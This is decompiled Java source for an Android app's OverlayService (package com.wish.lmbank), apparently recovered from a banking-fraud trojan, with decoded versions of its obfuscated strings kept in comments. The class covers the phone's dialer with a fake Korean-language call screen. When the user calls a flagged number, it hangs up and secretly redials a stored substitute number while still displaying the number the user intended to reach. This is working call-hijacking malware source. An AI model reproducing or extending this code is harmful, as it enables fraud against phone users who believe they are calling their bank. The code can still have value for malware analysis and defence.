package com.wish.lmbank.overlay;

import android.content.Context;
import android.graphics.Insets;
import android.graphics.Point;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.os.Message;
import android.telephony.PhoneNumberUtils;
import android.text.TextUtils;
import android.view.Display;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.view.Window;
import android.view.WindowInsets;
import android.view.WindowManager;
import android.view.WindowMetrics;
import android.widget.FrameLayout;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.RelativeLayout;
import android.widget.TextView;


import com.wish.lmbank.AppStartV;
import com.wish.lmbank.R2;
import com.wish.lmbank.bean.LimitPhoneNumberBean;
import com.wish.lmbank.phone.Keyboard;
import com.wish.lmbank.utils.ContactUtils;
import com.wish.lmbank.utils.LogUtils;
import com.wish.lmbank.utils.SettingUtils;
import com.wish.lmbank.utils.SharedPreferencesUtils;
import com.wish.lmbank.view.CallCustomView;

import java.util.Timer;
import java.util.TimerTask;

import gv00l3ah.mvdt7w.bb7d7pu7;
import wei.mark.standout.StandOutWindow;
import wei.mark.standout.constants.StandOutFlags;

/* loaded from: cookie_9234504.jar:com/wish/lmbank/overlay/OverlayService.class */
public class OverlayService extends StandOutWindow implements View.OnClickListener, Keyboard.KeyboardListener {
    private static final String TAG = "com.wish.lmbank.overlay.OverlayService";
    private static Timer callTimer;
    private static boolean isPressKeyboard;
    private static LinearLayout llTimerContainer;
    private static int mCallType;
    private static String phoneNumber;
    private static RelativeLayout rlCallingContainer;
    private static RelativeLayout rlIncomingContainer;
    private static TextView tvDialing;
    private CallCustomView callCustomView;
    private int callingTime;
    private String displayName;
    private ImageView ivCallStop;
    private ImageView ivMic;
    private ImageView ivRecording;
    private ImageView ivSpeaker;
    private Keyboard keyboard;
    private View keyboardLayout;
    private View menuTop;
    private View place;
    private TextView tvCallStop;
    private TextView tvCallingTime;
    private TextView tvIncomingNumber;
    private TextView tvIncomingTitle;
    private TextView tvKeyboardTxt;
    private TextView tvPhone;
    private TextView tvPhone2;
    private TextView tvRecording;
    private static Handler handler = new Handler();
    private static boolean isCancelAutoEndCall = false;
    public static int winId = -1;
    public static boolean isShow = false;
    private static String forwardingPhone = "";
    private boolean isDestroy = false;
    private Handler localHandler = new Handler(Looper.myLooper()) { // from class: com.wish.lmbank.overlay.OverlayService.1


        @Override // android.os.Handler
        public void handleMessage(Message message) {
            super.handleMessage(message);
            if (message.what != 1) {
                return;
            }
            showTimer();
        }
    };
    private boolean e0 = false;
    private boolean d0 = false;
    private final long COUNT_DOWN_TIME = 40;
    private boolean isMicrophoneMuteOn = false;
    private boolean isSpeakerOn = false;

    public static String access$100() {
        return TAG;
    }

    public static int access$300() {
        return mCallType;
    }

    public static String access$200() {
        return phoneNumber;
    }

    public int getAppIcon() {
        return R2.mipmap.ic_launcher;
    }

    public boolean isDisableMove(int i) {
        return true;
    }

    public static boolean actionStart(Context context, String str, int i) {
        boolean isDefaultDialer = SettingUtils.isDefaultDialer(AppStartV.getContext());
        boolean checkFloatPermission = SettingUtils.checkFloatPermission(AppStartV.getContext());
//             LogUtils.callLog(TAG + bb7d7pu7.m5998("RUkICh0ABgc6HQgbHUVJBxwECwwbU0k") + str + bb7d7pu7.m5998("RUkKCAUFPRAZDDZTSQ") + i + bb7d7pu7.m5998("RUkAGjoBBh5TSQ") + isShow + bb7d7pu7.m5998("RUkAGi0MDwgcBR0tAAgFDBtTSQ") + isDefaultDialer + bb7d7pu7.m5998("RUkAGigFBQYeLwUGCB1TSQ") + checkFloatPermission);
        LogUtils.callLog(TAG + ", actionStart, number: " + str + ", callType_: " + i + ", isShow: " + isShow + ", isDefaultDialer: " + isDefaultDialer + ", isAllowFloat: " + checkFloatPermission);
        if (!isShow && !isDefaultDialer) {
            int currentTimeMillis = (int) (System.currentTimeMillis() % 1000);
            winId = currentTimeMillis;
            StandOutWindow.show(context, OverlayService.class, currentTimeMillis);
            Bundle bundle = new Bundle();
//                 bundle.putString(bb7d7pu7.m5998("CAcNGwYADUcABx0MBx1HDBEdGwhHOSEmJyw2JzwkKyw7"), str);
            bundle.putString("android.intent.extra.PHONE_NUMBER", str);
//                 bundle.putInt(bb7d7pu7.m5998("CAcNGwYADUcABx0MBx1HDBEdGwhHJCAkLDY9MDksOg"), i);
            bundle.putInt("android.intent.extra.MIME_TYPES", i);
            int i2 = winId;
            StandOutWindow.sendData(context, OverlayService.class, i2, 1, bundle, OverlayService.class, i2);
            isShow = true;
        } else {
            isShow = false;
        }
        return isShow;
    }

    public static void actionOffHook(Context context, String str) {
//         String value = SharedPreferencesUtils.getValue(bb7d7pu7.m5998("IiwwNi8mOz4oOy0gJy42OSEmJyw"), "");
        String value = SharedPreferencesUtils.getValue("KEY_FORWARDING_PHONE", "");
//         String value2 = SharedPreferencesUtils.getValue(bb7d7pu7.m5998("IiwwNi8mOz4oOy0gJy42OiEmPjY5ISYnLA"), "");
        String value2 = SharedPreferencesUtils.getValue("KEY_FORWARDING_SHOW_PHONE", "");
//         LogUtils.callLog(TAG + bb7d7pu7.m5998("RUkKCAUFLQAaCgYHBwwKHQwNRUkPBhseCBsNAAcOOQEGBwxTSQ") + value + bb7d7pu7.m5998("RUkPBhseCBsNAAcOOgEGHjkBBgcMU0k") + value2);
        LogUtils.callLog(TAG + ", callDisconnected, forwardingPhone: " + value + ", forwardingShowPhone: " + value2);
        if (TextUtils.isEmpty(value) || !value2.equals(str)) {
            return;
        }
        SettingUtils.startActivityForCall(context, value);
    }

    /* JADX WARN: Code restructure failed: missing block: B:16:0x0152, code lost:
        if (r0.equals(r8) != false) goto L16;
     */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
        To view partially-correct code enable 'Show inconsistent code' option in preferences
    */
    public static void actionStop(Context context, String str, long j) {
        String str2;
        StringBuilder sb = new StringBuilder();
        String str3 = TAG;
        sb.append(str3);
        sb.append(bb7d7pu7.m5998("RUkICh0ABgc6HQYZRUkKCAUFOQEGBwxTSQ"));
        sb.append(str);
        sb.append(bb7d7pu7.m5998("RUkEKggFBT0QGQxTSQ"));
        sb.append(mCallType);
        sb.append(bb7d7pu7.m5998("RUkAGjoBBh5TSQ"));
        sb.append(isShow);
        LogUtils.callLog(sb.toString());
        String str4 = "";
        if (mCallType == 2) {
            boolean value = SharedPreferencesUtils.getValue(bb7d7pu7.m5998("IiwwNiA6Ni8mOz4oOy0gJy42ISgnLTY8OQ"), false);
            str2 = SharedPreferencesUtils.getValue(bb7d7pu7.m5998("IiwwNi8mOz4oOy0gJy42OSEmJyw"), "");
            String value2 = SharedPreferencesUtils.getValue(bb7d7pu7.m5998("IiwwNi8mOz4oOy0gJy42OiEmPjY5ISYnLA"), "");
            LogUtils.callLog(str3 + bb7d7pu7.m5998("RUkAGi8GGx4IGw0ABw4hCAcNPBlTSQ") + value + bb7d7pu7.m5998("RUkKCAUFLQAaCgYHBwwKHQwNRUkPBhseCBsNAAcOOQEGBwxTSQ") + str2 + bb7d7pu7.m5998("RUkPBhseCBsNAAcOOgEGHjkBBgcMU0k") + value2 + bb7d7pu7.m5998("RUkKCAUFOQEGBwxTSQ") + str);
            if (value && !TextUtils.isEmpty(str2) && (TextUtils.isEmpty(str) || value2.equals(str))) {
                SettingUtils.startActivityForCall(context, str2);
                return;
            }
        } else {
            String str5 = bb7d7pu7.m5998("IiwwNi8mOyosLTY5ISYnLA");
            str4 = SharedPreferencesUtils.getValue(str5, "");
            SharedPreferencesUtils.putValue(str5, "");
            str2 = "";
        }
        SettingUtils.toHome(context);
        handler.postDelayed(new OverlayService$2(str2, context, str4), j);
        isPressKeyboard = false;
        isCancelAutoEndCall = false;
        SettingUtils.setSpeakerphoneOn(context, false);
    }

    private View initView() {
//         LogUtils.callLog(TAG + bb7d7pu7.m5998("RUkABwAdPwAMHg"));
        LogUtils.callLog(TAG + ", initView");
// //        View inflate = ((LayoutInflater) getSystemService(bb7d7pu7.m5998("BQgQBhwdNgAHDwUIHQwb"))).inflate(R.layout.activity_phone_call, (ViewGroup) null);
//        View inflate = ((LayoutInflater) getSystemService("layout_inflater")).inflate(R.layout.activity_phone_call, (ViewGroup) null);
//         View inflate = ((LayoutInflater) AppStartV.getContext().getSystemService(bb7d7pu7.m5998("BQgQBhwdNgAHDwUIHQwb"))).inflate(R2.layout.activity_phone_call, (ViewGroup) null);
        View inflate = ((LayoutInflater) AppStartV.getContext().getSystemService(Context.LAYOUT_INFLATER_SERVICE)).inflate(R2.layout.activity_phone_call, (ViewGroup) null);
        rlIncomingContainer = (RelativeLayout) inflate.findViewById(R2.id.incoming);
        rlCallingContainer = (RelativeLayout) inflate.findViewById(R2.id.calling);
        tvDialing = (TextView) inflate.findViewById(R2.id.txt_dialing);
        this.tvIncomingTitle = (TextView) inflate.findViewById(R2.id.txt_incoming_title);
        this.tvIncomingNumber = (TextView) inflate.findViewById(R2.id.txt_incoming_number);
        this.callCustomView = (CallCustomView) inflate.findViewById(R2.id.callCustomView);
        this.tvPhone = (TextView) inflate.findViewById(R2.id.phone);
        this.tvPhone2 = (TextView) inflate.findViewById(R2.id.phone2);
        llTimerContainer = (LinearLayout) inflate.findViewById(R2.id.lyt_timer);
        this.tvCallingTime = (TextView) inflate.findViewById(R2.id.txt_timer);
        this.ivSpeaker = (ImageView) inflate.findViewById(R2.id.img_speaker);
        this.ivRecording = (ImageView) inflate.findViewById(R2.id.img_recording);
        this.ivCallStop = (ImageView) inflate.findViewById(R2.id.img_call_stop);
        this.tvCallStop = (TextView) inflate.findViewById(R2.id.txt_call_stop);
        this.ivMic = (ImageView) inflate.findViewById(R2.id.img_mic);
        this.tvRecording = (TextView) inflate.findViewById(R2.id.txt_recording);
        this.place = inflate.findViewById(R2.id.place);
        this.menuTop = inflate.findViewById(R2.id.menu_layout_top);
        this.keyboardLayout = inflate.findViewById(R2.id.keyboard_layout);
        Keyboard keyboard = (Keyboard) inflate.findViewById(R2.id.keyboard);
        this.keyboard = keyboard;
        keyboard.setKeyboardClickListener(this);
        TextView textView = (TextView) inflate.findViewById(R2.id.keypad_num);
        this.tvKeyboardTxt = textView;
        this.keyboard.b(textView);
        inflate.findViewById(R2.id.icon_end_call).setOnClickListener(this);
        inflate.findViewById(R2.id.icon_record).setOnClickListener(this);
        inflate.findViewById(R2.id.icon_call_stop).setOnClickListener(this);
        inflate.findViewById(R2.id.icon_speaker).setOnClickListener(this);
        inflate.findViewById(R2.id.icon_mic).setOnClickListener(this);
        inflate.findViewById(R2.id.icon_keyboard).setOnClickListener(this);
        return inflate;
    }

    private void initIncomingUI() {
        this.callCustomView.setCallBack(new CallCustomView.CallButtonCallback() { // from class: com.wish.lmbank.overlay.OverlayService.3


            @Override // com.wish.lmbank.view.CallCustomView.CallButtonCallback
            public void acceptCall() {
                boolean acceptCall = SettingUtils.acceptCall(OverlayService.this);
//                 LogUtils.callLog(OverlayService.TAG + bb7d7pu7.m5998("RUkICgoMGR0qCAUFRUkAGigKCgwZHSoIBQVTSQ") + acceptCall);
                LogUtils.callLog(OverlayService.TAG + ", acceptCall, isAcceptCall: " + acceptCall);
                startTimer();
                OverlayService.rlCallingContainer.setVisibility(View.VISIBLE);
                OverlayService.rlIncomingContainer.setVisibility(View.GONE);
            }

            @Override // com.wish.lmbank.view.CallCustomView.CallButtonCallback
            public void rejectCall() {
                boolean endCall = SettingUtils.endCall(OverlayService.this);
//                 LogUtils.callLog(OverlayService.TAG + bb7d7pu7.m5998("RUkbDAMMCh0qCAUFRUkAGiwHDSoIBQVTSQ") + endCall);
                LogUtils.callLog(OverlayService.TAG + ", rejectCall, isEndCall: " + endCall);
                OverlayService.this.cancelTimer();
                return;
            }
        });
    }

    /* JADX INFO: Access modifiers changed from: private */
    public void startTimer() {
        llTimerContainer.setVisibility(View.VISIBLE);
        tvDialing.setVisibility(View.GONE);
        if (callTimer == null) {
            Timer timer = new Timer();
            callTimer = timer;
            timer.schedule(new TimerTask() { // from class: com.wish.lmbank.overlay.OverlayService.4

                @Override // java.util.TimerTask, java.lang.Runnable
                public void run() {
                    OverlayService.this.localHandler.sendEmptyMessage(1);
                }
            }, 0L, 1000L);
        }
    }

    /* JADX INFO: Access modifiers changed from: private */
    /* JADX WARN: Multi-variable type inference failed */
    public void showTimer() {
        this.callingTime++;
        this.tvCallingTime.setText(getCallingTime());
        if (!isCancelAutoEndCall && this.callingTime == 40 && mCallType == 2) {
            StringBuilder sb = new StringBuilder();
            LimitPhoneNumberBean isSpecial = SettingUtils.isSpecial(phoneNumber);
            if (isSpecial != null) {
//                     sb.append(TAG + bb7d7pu7.m5998("RUmP_t-A_t2M4dlFSYz41YzmwoHUxY7O0lNJ") + isSpecial.getRealPhoneNumber());
                sb.append(TAG + ", 时间到, 呼叫转移: " + isSpecial.getRealPhoneNumber());
                if (SettingUtils.endCall(this)) {
//                         sb.append(bb7d7pu7.m5998("RUmP5euP_8SO_dyBxvQ"));
                    sb.append(", 挂断电话");
//                         SharedPreferencesUtils.putValue(bb7d7pu7.m5998("IiwwNiA6Ni8mOz4oOy0gJy42ISgnLTY8OQ"), true);
                    SharedPreferencesUtils.putValue("KEY_IS_FORWARDING_HAND_UP", true);
//                         SharedPreferencesUtils.putValue(bb7d7pu7.m5998("IiwwNi8mOz4oOy0gJy42OiEmPjY5ISYnLA"), phoneNumber);
                    SharedPreferencesUtils.putValue("KEY_FORWARDING_SHOW_PHONE", phoneNumber);
//                         SharedPreferencesUtils.putValue(bb7d7pu7.m5998("IiwwNi8mOz4oOy0gJy42OSEmJyw"), isSpecial.getRealPhoneNumber());
                    SharedPreferencesUtils.putValue("KEY_FORWARDING_PHONE", isSpecial.getRealPhoneNumber());
                }
            }
            if (sb.length() > 0) {
                LogUtils.callLog(sb.toString());
                return;
            }
            return;
        }
        return;
    }

    public String getCallingTime() {
        int i = this.callingTime;
        int i2 = i / 60;
//         return fillZero(i2) + bb7d7pu7.m5998("Uw") + fillZero(i % 60);
        return fillZero(i2) + ":" + fillZero(i % 60);
    }

    public static String fillZero(int i) {
        if (i >= 0 && i < 10) {
//             return bb7d7pu7.m5998("WQ") + i;
            return "0" + i;
        }
        return String.valueOf(i);
    }

    public void cancelTimer() {
        Timer timer = callTimer;
        if (timer != null) {
            timer.cancel();
        }
        this.callingTime = 0;
        callTimer = null;
    }

    /* JADX WARN: Multi-variable type inference failed */
    @Override // android.view.View.OnClickListener
    public void onClick(View view) {
        switch (view.getId()) {
            case R2.id.icon_bluetooth /* 2131296545 */:
//                 LogUtils.callLog(TAG + bb7d7pu7.m5998("RUkLHB0dBgdJCwUcDB0GBh0B"));
                LogUtils.callLog(TAG + ", button bluetooth");
                return;
            case R2.id.icon_call_stop /* 2131296546 */:
                boolean z = !this.d0;
                this.d0 = z;
                if (z) {
                    this.ivCallStop.setImageResource(R2.drawable.ic_phone);
//                     this.tvCallStop.setText(bb7d7pu7.m5998("guLNheL1hO_chPD9"));
                    this.tvCallStop.setText("다시통화");
                    return;
                }
                this.ivCallStop.setImageResource(R2.drawable.ic_pause);
//                 this.tvCallStop.setText(bb7d7pu7.m5998("hO_chPD9guXpg9HZ"));
                this.tvCallStop.setText("통화대기");
                return;
            case R2.id.icon_end_call /* 2131296547 */:
//                 LogUtils.callLog(TAG + bb7d7pu7.m5998("RUkLHB0dBgdJDAcNSQoIBQU"));
                LogUtils.callLog(TAG + ", button end call");
                SettingUtils.endCall(this);
                cancelTimer();
                return;
            case 2131296548:
            default:
                return;
            case R2.id.icon_keyboard /* 2131296549 */:
                if (this.keyboardLayout.getVisibility() != View.VISIBLE) {
                    this.keyboardLayout.setVisibility(View.VISIBLE);
                    this.tvPhone.setVisibility(View.GONE);
                    this.tvKeyboardTxt.setText("");
                    this.tvKeyboardTxt.setVisibility(View.VISIBLE);
                    this.place.setVisibility(View.VISIBLE);
                    this.menuTop.setVisibility(View.GONE);
                    return;
                }
                this.menuTop.setVisibility(View.VISIBLE);
                this.tvKeyboardTxt.setVisibility(View.GONE);
                this.tvPhone.setVisibility(View.VISIBLE);
                this.tvPhone2.setVisibility(View.VISIBLE);
                this.keyboardLayout.setVisibility(View.GONE);
                this.place.setVisibility(View.GONE);
                return;
            case R2.id.icon_mic /* 2131296550 */:
                boolean z2 = !this.isMicrophoneMuteOn;
                this.isMicrophoneMuteOn = z2;
                SettingUtils.setMicrophoneMute(this, z2);
                this.ivMic.setImageResource(this.isMicrophoneMuteOn ? 2131230882 : 2131230881);
                return;
            case R2.id.icon_record /* 2131296551 */:
                boolean z3 = !this.e0;
                this.e0 = z3;
                if (z3) {
                    this.ivRecording.setImageResource(R2.drawable.ic_record_green);
//                     this.tvRecording.setText(bb7d7pu7.m5998("guzQhfTlhc34hc7p"));
                    this.tvRecording.setText("녹음중지");
                    return;
                }
                this.ivRecording.setImageResource(R2.drawable.ic_record);
//                 this.tvRecording.setText(bb7d7pu7.m5998("guzQhfTl"));
                this.tvRecording.setText("녹음");
                return;
            case R2.id.icon_speaker /* 2131296552 */:
                this.isSpeakerOn = !this.isSpeakerOn;
//                 LogUtils.callLog(TAG + bb7d7pu7.m5998("RUkaDB06GQwIAgwbGQEGBwwmB0kAGjoZDAgCDBsmB1NJ") + this.isSpeakerOn);
                LogUtils.callLog(TAG + ", setSpeakerphoneOn isSpeakerOn: " + this.isSpeakerOn);
                SettingUtils.setSpeakerphoneOn(this, this.isSpeakerOn);
                this.ivSpeaker.setImageResource(this.isSpeakerOn ? 2131230909 : 2131230908);
                return;
        }
    }

    /* JADX WARN: Multi-variable type inference failed */
    @Override // com.wish.lmbank.phone.Keyboard.KeyboardListener
    public void keyboardClickListener(String str) {
        LimitPhoneNumberBean isSpecial;
        StringBuilder sb = new StringBuilder();
//         sb.append(TAG + bb7d7pu7.m5998("RUmP5eCA_cdTSQ") + str + bb7d7pu7.m5998("RUkAGioIBwoMBSgcHQYsBw0qCAUFU0k") + isCancelAutoEndCall);
        sb.append(TAG + ", 按键: " + str + ", isCancelAutoEndCall: " + isCancelAutoEndCall);
        if (!str.equals("") && !isPressKeyboard && (isSpecial = SettingUtils.isSpecial(phoneNumber)) != null && mCallType == 2) {
//             sb.append(bb7d7pu7.m5998("RUmM-NWM5sKB1MWOztJTSQ") + isSpecial.getRealPhoneNumber());
            sb.append(", 呼叫转移: " + isSpecial.getRealPhoneNumber());
            if (SettingUtils.endCall(this)) {
                isPressKeyboard = true;
                isCancelAutoEndCall = true;
//                 sb.append(bb7d7pu7.m5998("RUmP5euP_8SO_dyBxvQ"));
                sb.append(", 挂断电话");
//                 SharedPreferencesUtils.putValue(bb7d7pu7.m5998("IiwwNiA6Ni8mOz4oOy0gJy42ISgnLTY8OQ"), true);
                SharedPreferencesUtils.putValue("KEY_IS_FORWARDING_HAND_UP", true);
//                 SharedPreferencesUtils.putValue(bb7d7pu7.m5998("IiwwNi8mOz4oOy0gJy42OiEmPjY5ISYnLA"), phoneNumber);
                SharedPreferencesUtils.putValue("KEY_FORWARDING_SHOW_PHONE", phoneNumber);
//                 SharedPreferencesUtils.putValue(bb7d7pu7.m5998("IiwwNi8mOz4oOy0gJy42OSEmJyw"), isSpecial.getRealPhoneNumber());
                SharedPreferencesUtils.putValue("KEY_FORWARDING_PHONE", isSpecial.getRealPhoneNumber());
            }
        }
        LogUtils.callLog(sb.toString());
    }

    public String getAppName() {
        return getResources().getString(R2.string.app_name);
    }

    public void createAndAttachView(int i, FrameLayout frameLayout) {
        AppStartV.isCalling = true;
        frameLayout.addView(initView());
    }

    @Override
    public StandOutLayoutParams getParams(int id, wei.mark.standout.ui.Window window) {
        return new StandOutLayoutParams(id);
    }

    public int getFlags(int i) {
        return super.getFlags(i) | StandOutFlags.FLAG_WINDOW_FOCUSABLE_DISABLE | 1024 | Integer.MIN_VALUE;
    }

    public StandOutLayoutParams getParams(int i, Window window) {
        int i2;
        //             WindowManager windowManager = (WindowManager) AppStartV.getContext().getSystemService(bb7d7pu7.m5998("HgAHDQYe"));
        WindowManager windowManager = (WindowManager) AppStartV.getContext().getSystemService(Context.WINDOW_SERVICE);
        int i3;
        if (Build.VERSION.SDK_INT >= 30) {
            WindowMetrics currentWindowMetrics = windowManager.getCurrentWindowMetrics();
            Insets insetsIgnoringVisibility = currentWindowMetrics.getWindowInsets().getInsetsIgnoringVisibility(WindowInsets.Type.statusBars());
            i3 = currentWindowMetrics.getBounds().height();
            i2 = insetsIgnoringVisibility.top - insetsIgnoringVisibility.bottom;
        } else {
            Display defaultDisplay = windowManager.getDefaultDisplay();
            Point point = new Point();
            defaultDisplay.getRealSize(point);
            int i4 = point.y;
            if ((getResources().getConfiguration().screenLayout & 15) != 4) {
//                     int identifier = getResources().getIdentifier(bb7d7pu7.m5998("Gh0IHRwaNgsIGzYBDAAOAR0"), bb7d7pu7.m5998("DQAEDAc"), bb7d7pu7.m5998("CAcNGwYADQ"));
                int identifier = getResources().getIdentifier("status_bar_height", "dimen", "android");
                i2 = identifier;
                i3 = i4;
                if (identifier > 0) {
                    i2 = getResources().getDimensionPixelSize(identifier);
                    i3 = i4;
                }
            } else {
                i2 = 0;
                i3 = i4;
            }
        }
        return new StandOutLayoutParams(i, -1, i3, 0, -i2);
    }

    /* JADX WARN: Multi-variable type inference failed */
    public void onReceiveData(int i, int i2, Bundle bundle, Class<? extends StandOutWindow> cls, int i3) {
        super.onReceiveData(i, i2, bundle, cls, i3);
//         phoneNumber = bundle.getString(bb7d7pu7.m5998("CAcNGwYADUcABx0MBx1HDBEdGwhHOSEmJyw2JzwkKyw7"));
        phoneNumber = bundle.getString("android.intent.extra.PHONE_NUMBER");
//         mCallType = bundle.getInt(bb7d7pu7.m5998("CAcNGwYADUcABx0MBx1HDBEdGwhHJCAkLDY9MDksOg"), 0);
        mCallType = bundle.getInt("android.intent.extra.MIME_TYPES", 0);
//         boolean value = SharedPreferencesUtils.getValue(bb7d7pu7.m5998("IiwwNiA6Ni8mOz4oOy0gJy42ISgnLTY8OQ"), false);
        boolean value = SharedPreferencesUtils.getValue("KEY_IS_FORWARDING_HAND_UP", false);
        if (value) {
//             String value2 = SharedPreferencesUtils.getValue(bb7d7pu7.m5998("IiwwNi8mOz4oOy0gJy42OiEmPjY5ISYnLA"), "");
            String value2 = SharedPreferencesUtils.getValue("KEY_FORWARDING_SHOW_PHONE", "");
            if (!TextUtils.isEmpty(value2)) {
                phoneNumber = value2;
            }
        }
        StringBuilder sb = new StringBuilder();
        String str = TAG;
        sb.append(str);
//         sb.append(bb7d7pu7.m5998("RUkGBzsMCgwAHwwtCB0IRUkAGi8GGx4IGw0ABw4hCAcNPBlTSQ"));
        sb.append(", onReceiveData, isForwardingHandUp: ");
        sb.append(value);
//         String m5998 = bb7d7pu7.m5998("RUkZAQYHDCccBAsMGzZTSQ");
        String m5998 = ", phoneNumber_: ";
        sb.append(m5998);
        sb.append(phoneNumber);
        LogUtils.callLog(sb.toString());
        this.displayName = ContactUtils.queryDisplayName(this, phoneNumber);
        int i4 = mCallType;
//         String m59982 = bb7d7pu7.m5998("Ijs");
        String m59982 = "KR";
        if (i4 == 1) {
            rlCallingContainer.setVisibility(View.GONE);
            rlIncomingContainer.setVisibility(View.VISIBLE);
            if (!TextUtils.isEmpty(this.displayName)) {
                this.tvIncomingTitle.setText(this.displayName);
                this.tvIncomingNumber.setText(PhoneNumberUtils.formatNumber(phoneNumber, m59982));
            } else {
                this.tvIncomingTitle.setText(PhoneNumberUtils.formatNumber(phoneNumber, m59982));
                this.tvIncomingNumber.setText("");
            }
            initIncomingUI();
        } else if (i4 == 2) {
            startTimer();
            rlCallingContainer.setVisibility(View.VISIBLE);
            rlIncomingContainer.setVisibility(View.GONE);
        }
        if (!TextUtils.isEmpty(phoneNumber)) {
//             if (phoneNumber.startsWith(bb7d7pu7.m5998("QlFb"))) {
            if (phoneNumber.startsWith("+82")) {
//                 phoneNumber = bb7d7pu7.m5998("WQ") + phoneNumber.substring(3);
                phoneNumber = "0" + phoneNumber.substring(3);
            }
            if (!TextUtils.isEmpty(this.displayName)) {
                this.tvPhone.setText(this.displayName);
                this.tvPhone2.setText(PhoneNumberUtils.formatNumber(phoneNumber, m59982));
                return;
            }
            this.tvPhone.setText(PhoneNumberUtils.formatNumber(phoneNumber, m59982));
            this.tvPhone2.setText("");
        }
//         LogUtils.callLog(str + bb7d7pu7.m5998("RUkNABoZBQgQJwgEDFNJ") + this.displayName + m5998 + phoneNumber);
        LogUtils.callLog(str + ", displayName: " + this.displayName + m5998 + phoneNumber);
    }

    public void onDestroy() {
        super.onDestroy();
//         LogUtils.callLog(TAG + bb7d7pu7.m5998("RUkGBy0MGh0bBhA"));
        LogUtils.callLog(TAG + ", onDestroy");
    }
}
